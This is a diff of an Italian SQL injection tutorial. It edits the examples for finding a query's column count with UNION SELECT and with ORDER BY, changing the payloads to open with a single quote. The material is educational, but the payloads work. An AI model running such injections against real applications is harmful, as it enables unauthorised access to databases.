@@ -62,18 +62,18 @@ Non conoscendo la query originale formulata dallo sviluppatore, dobbiamo scoprir
 * **Metodo 1: Brute-Force con UNION SELECT**
   Consiste nel tentare di unire query con un numero crescente di valori fittizi (numeri o `NULL`) finché il database smette di restituire errori di sintassi:
   ```sql
-  1 UNION SELECT 1 --      -> Errore (colonne non corrispondenti)
-  1 UNION SELECT 1,2 --    -> Errore
-  1 UNION SELECT 1,2,3 --  -> Successo! Le colonne sono esattamente 3.
+  1' UNION SELECT 1 --      -> Errore (colonne non corrispondenti)
+  1' UNION SELECT 1,2 --    -> Errore
+  1' UNION SELECT 1,2,3 --  -> Successo! Le colonne sono esattamente 3.
   ```
 
 * **Metodo 2: Uso della keyword ORDER BY (Più efficiente)**
   La clausola `ORDER BY` ordina i risultati in base a una colonna. Al posto del nome della colonna, accetta anche l'indice numerico (1 per la prima colonna, 2 per la seconda, ecc.). Se inseriamo un indice superiore al numero di colonne effettive, il database genererà un errore. Possiamo usare una ricerca binaria o esponenziale per trovare il limite:
   ```sql
-  1 ORDER BY 1 --   -> OK
-  1 ORDER BY 2 --   -> OK
-  1 ORDER BY 4 --   -> Errore! (Non esiste la quarta colonna)
-  1 ORDER BY 3 --   -> OK. Le colonne totali sono 3.
+  1' ORDER BY 1 --   -> OK
+  1' ORDER BY 2 --   -> OK
+  1' ORDER BY 4 --   -> Errore! (Non esiste la quarta colonna)
+  1' ORDER BY 3 --   -> OK. Le colonne totali sono 3.
   ```
 
 ##### 2. Annullare l'Output della Query Originale
